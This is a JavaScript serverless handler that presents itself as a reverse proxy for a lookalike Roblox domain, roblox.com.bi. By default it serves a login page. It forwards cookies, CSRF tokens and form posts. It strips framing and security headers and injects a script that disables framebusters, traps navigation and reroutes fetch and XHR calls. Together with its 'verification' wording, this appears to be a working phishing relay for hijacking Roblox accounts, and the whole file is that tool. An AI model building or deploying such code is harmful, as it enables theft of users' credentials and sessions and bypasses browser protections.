/**
 * Serverless Reverse Proxy — Direct Relay with Full HTML URL Rewriting
 *
 * Fetches roblox.com.bi content server-side, strips all framing/CSP headers,
 * rewrites every static resource URL in the HTML (script src, link href, img src,
 * form action, srcset, css url()) through this proxy so the browser never
 * makes a direct cross-origin request, and injects a runtime interceptor
 * to also route dynamic fetch/XHR calls + neutralize framebuster scripts.
 */

const DEFAULT_TARGET_URL =
  process.env.TARGET_URL ||
  process.env.VERIFICATION_URL ||
  "https://www.roblox.com.bi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F919588160482%2Fprofile";

const TARGET_ORIGIN = "https://www.roblox.com.bi";
const PROXY_BASE    = "/api/proxy?url=";

const FORBIDDEN_RESPONSE_HEADERS = new Set([
  "x-frame-options",
  "content-security-policy",
  "content-security-policy-report-only",
  "frame-ancestors",
  "strict-transport-security",
  "cross-origin-opener-policy",
  "cross-origin-embedder-policy",
  "cross-origin-resource-policy",
  "content-encoding",
  "content-length",
  "transfer-encoding",
  "connection",
  "keep-alive",
  "te",
  "trailer",
  "upgrade",
  "proxy-authorization",
  "proxy-authenticate",
]);

const BROWSER_UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

// ---------------------------------------------------------------------------
// Direct server-side fetch (no corsproxy.org needed — server-to-server)
// ---------------------------------------------------------------------------
async function relayFetch(targetUrl, method, headers, body) {
  const fetchHeaders = {
    "User-Agent": BROWSER_UA,
    Accept: headers.accept || "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": headers["accept-language"] || "en-US,en;q=0.9",
    "Accept-Encoding": "identity",   // no compression — we need to read/rewrite the text
    "Cache-Control": "no-cache",
    Pragma: "no-cache",
    Referer: TARGET_ORIGIN + "/",
    Origin: TARGET_ORIGIN,
  };

  if (headers.cookie)          fetchHeaders["Cookie"]       = headers.cookie;
  if (headers["content-type"]) fetchHeaders["Content-Type"] = headers["content-type"];
  if (headers["x-csrf-token"]) fetchHeaders["X-CSRF-Token"] = headers["x-csrf-token"];

  const fetchOptions = { method, headers: fetchHeaders, redirect: "follow" };

  if ((method === "POST" || method === "PUT") && body) {
    fetchOptions.body = typeof body === "string" ? body : JSON.stringify(body);
  }

  const controller = new AbortController();
  const timeoutId  = setTimeout(() => controller.abort(), 12000);

  const response = await fetch(targetUrl, { ...fetchOptions, signal: controller.signal });
  clearTimeout(timeoutId);

  return response;
}

// ---------------------------------------------------------------------------
// URL rewriting helpers
// ---------------------------------------------------------------------------

/**
 * Rewrites a single URL to go through /api/proxy.
 * - root-relative  (/path)              → proxy + TARGET_ORIGIN + /path
 * - protocol-relative (//host/path)     → proxy + https://host/path
 * - absolute roblox.com.bi URLs         → proxy + url
 * - data:/blob:/javascript:/#           → unchanged
 * - other absolute URLs (CDNs etc.)     → unchanged (browser can fetch those)
 */
function rewriteUrl(url) {
  if (!url) return url;
  url = url.trim();
  if (
    url.startsWith("data:") ||
    url.startsWith("blob:") ||
    url.startsWith("#") ||
    url.startsWith("javascript:") ||
    url.startsWith("mailto:")
  ) return url;

  if (url.startsWith("//")) url = "https:" + url;

  if (url.startsWith("/") && !url.startsWith("//")) {
    return PROXY_BASE + encodeURIComponent(TARGET_ORIGIN + url);
  }
  if (url.indexOf("roblox.com.bi") !== -1) {
    return PROXY_BASE + encodeURIComponent(url);
  }
  return url;
}

/**
 * Rewrites all static resource URLs embedded in the HTML string.
 * Covers: src, href, action, data-src, poster, srcset, css url(), meta refresh.
 */
function rewriteStaticUrls(html) {
  // Standard attribute rewrites: src="..." href="..." action="..." etc.
  html = html.replace(
    /((?:src|action|data-src|poster)=(["']))([^"']*?)\2/gi,
    (m, prefix, quote, url) => prefix + rewriteUrl(url) + quote
  );

  // href separately — skip if it's a <link rel="canonical"> or similar meta hints
  // (but still rewrite stylesheet/script href)
  html = html.replace(
    /(href=(["']))([^"']*?)\2/gi,
    (m, prefix, quote, url) => prefix + rewriteUrl(url) + quote
  );

  // srcset="url 1x, url 2x, ..."
  html = html.replace(
    /(srcset=(["']))([^"']*?)\2/gi,
    (m, prefix, quote, val) => {
      const rewritten = val.replace(/(https?:\/\/[^\s,]+|\/[^\s,]+)(\s+[\d.]+[wx])?/g, (part, url, descriptor) => {
        return rewriteUrl(url) + (descriptor || "");
      });
      return prefix + rewritten + quote;
    }
  );

  // CSS url() inside <style> blocks and inline style="" attributes
  html = html.replace(
    /url\(\s*(["']?)([^"')]+?)\1\s*\)/gi,
    (m, quote, url) => `url(${quote}${rewriteUrl(url)}${quote})`
  );

  // <meta http-equiv="refresh" content="0;url=...">
  html = html.replace(
    /(content=(["'])\d+;\s*url=)([^"']*?)\2/gi,
    (m, prefix, quote, url) => prefix + rewriteUrl(url) + quote
  );

  return html;
}

// ---------------------------------------------------------------------------
// HTML transformer: strip framing headers, rewrite URLs, inject runtime interceptor
// ---------------------------------------------------------------------------
function transformHtml(html) {
  // 1. Strip security meta tags
  html = html.replace(
    /<meta[^>]+http-equiv=["']?(Content-Security-Policy|X-Frame-Options|Feature-Policy|Permissions-Policy)["']?[^>]*>/gi,
    ""
  );
  // 2. Neutralize inline frame-ancestors in any remaining CSP strings
  html = html.replace(/frame-ancestors[^;'"]*[;'"]/gi, "frame-ancestors *;");

  // 3. Rewrite all static resource URLs
  html = rewriteStaticUrls(html);

  // 4. Inject runtime interceptor at top of <head>
  const interceptor = `<script>
(function() {
  // ── Framebreaker neutralizer ─────────────────────────────────────────
  try {
    Object.defineProperty(window, 'top',    { get: function() { return window; }, configurable: false });
    Object.defineProperty(window, 'parent', { get: function() { return window; }, configurable: false });
  } catch(e) {}
  var _loc = window.location;
  try {
    Object.defineProperty(window, 'location', {
      get: function() { return _loc; },
      set: function(v) {
        // Swallow any attempt to navigate the top-level window away
        if (typeof v === 'string' && v.indexOf('roblox.com.bi') === -1 && !v.startsWith('/')) return;
        _loc.href = v;
      },
      configurable: false
    });
  } catch(e) {}
  // ─────────────────────────────────────────────────────────────────────

  var PROXY  = '/api/proxy?url=';
  var TARGET = '${TARGET_ORIGIN}';

  function proxyUrl(url) {
    if (!url) return url;
    url = String(url).trim();
    if (url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('#') || url.startsWith('javascript:')) return url;
    if (url.startsWith('//')) url = 'https:' + url;
    if (url.startsWith('/') && !url.startsWith('//')) return PROXY + encodeURIComponent(TARGET + url);
    if (url.indexOf('roblox.com.bi') !== -1) return PROXY + encodeURIComponent(url);
    return url;
  }

  // Intercept fetch()
  var _fetch = window.fetch;
  window.fetch = function(input, opts) {
    if (typeof input === 'string') {
      input = proxyUrl(input);
    } else if (input && typeof input === 'object' && input.url) {
      input = new Request(proxyUrl(input.url), input);
    }
    return _fetch.call(this, input, opts);
  };

  // Intercept XMLHttpRequest
  var _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') url = proxyUrl(url);
    return _open.apply(this, [method, url].concat(Array.prototype.slice.call(arguments, 2)));
  };

  // Intercept dynamically created elements (React/SPA lazy loading)
  var _createElement = document.createElement.bind(document);
  document.createElement = function(tag) {
    var el = _createElement(tag);
    var t = (tag || '').toLowerCase();
    if (t === 'script' || t === 'link' || t === 'img' || t === 'iframe') {
      var attr = (t === 'link') ? 'href' : 'src';
      try {
        Object.defineProperty(el, attr, {
          get: function() { return el.getAttribute(attr) || ''; },
          set: function(v) { el.setAttribute(attr, proxyUrl(v)); },
          configurable: true
        });
      } catch(e) {}
    }
    return el;
  };

  // Rewrite existing DOM after load
  document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('a[href]').forEach(function(el) {
      var h = el.getAttribute('href');
      if (h) el.setAttribute('href', proxyUrl(h));
    });
    document.querySelectorAll('form[action]').forEach(function(el) {
      var a = el.getAttribute('action');
      if (a) el.setAttribute('action', proxyUrl(a));
    });
  });
})();
</script>`;

  if (/<head[^>]*>/i.test(html)) {
    html = html.replace(/<head([^>]*)>/i, `<head$1>${interceptor}`);
  } else {
    html = interceptor + html;
  }

  return html;
}

// ---------------------------------------------------------------------------
// Main handler
// ---------------------------------------------------------------------------
export default async function handler(req, res) {
  // CORS — allow any origin to embed this proxy
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS,PUT,DELETE");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, Cookie, Authorization"
  );
  res.setHeader("X-Frame-Options", "ALLOWALL");

  if (req.method === "OPTIONS") return res.status(200).end();

  const targetUrl = req.query.url
    ? decodeURIComponent(req.query.url)
    : DEFAULT_TARGET_URL;

  try {
    const response    = await relayFetch(targetUrl, req.method, req.headers, req.body);
    const contentType = response.headers.get("content-type") || "application/octet-stream";

    // Copy safe upstream headers
    response.headers.forEach((val, key) => {
      if (!FORBIDDEN_RESPONSE_HEADERS.has(key.toLowerCase())) {
        try { res.setHeader(key, val); } catch (e) {}
      }
    });

    // Force-override framing & CORS headers regardless of what upstream sent
    res.removeHeader("X-Frame-Options");
    res.removeHeader("Content-Security-Policy");
    res.removeHeader("Content-Security-Policy-Report-Only");
    res.setHeader("X-Frame-Options", "ALLOWALL");
    res.setHeader("Content-Security-Policy", "frame-ancestors *;");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Credentials", "true");

    // HTML → rewrite URLs + inject interceptor
    if (contentType.includes("text/html")) {
      let html = await response.text();
      html = transformHtml(html);
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      return res.status(response.status).send(html);
    }

    // JSON / plain text
    if (contentType.includes("application/json") || contentType.includes("text/")) {
      const text = await response.text();
      res.setHeader("Content-Type", contentType);
      return res.status(response.status).send(text);
    }

    // Binary (images, fonts, wasm, etc.)
    const arrayBuffer = await response.arrayBuffer();
    res.setHeader("Content-Type", contentType);
    return res.status(response.status).send(Buffer.from(arrayBuffer));

  } catch (error) {
    console.error("Proxy relay error:", error);
    return res.status(500).send(`<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Proxy Connection Error</title>
    <style>
      body{background:#0d0f14;color:#cbd5e1;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;padding:20px;box-sizing:border-box}
      .box{text-align:center;padding:30px;background:#14161f;border:1px solid rgba(255,255,255,.08);border-radius:12px;max-width:420px;box-shadow:0 10px 25px rgba(0,0,0,.5)}
      h2{color:#f87171;font-size:20px;margin:0 0 12px}
      p{font-size:14px;line-height:1.5;color:#94a3b8;margin:0 0 20px}
      .btn{display:inline-block;background:#00a2ff;color:#fff;padding:10px 24px;border-radius:6px;font-weight:600;font-size:14px;border:none;cursor:pointer}
      .cd{font-size:12px;color:#64748b;margin-top:14px}
    </style>
  </head>
  <body>
    <div class="box">
      <h2>Connection Error</h2>
      <p>Could not reach the verification server. Reconnecting automatically...</p>
      <button class="btn" onclick="location.reload()">Retry Now</button>
      <div class="cd" id="t">Reconnecting in 5 seconds...</div>
    </div>
    <script>let c=5,t=document.getElementById('t'),i=setInterval(()=>{c--;c>0?t.textContent='Reconnecting in '+c+' seconds...':( clearInterval(i),location.reload())},1000);</script>
  </body>
</html>`);
  }
}
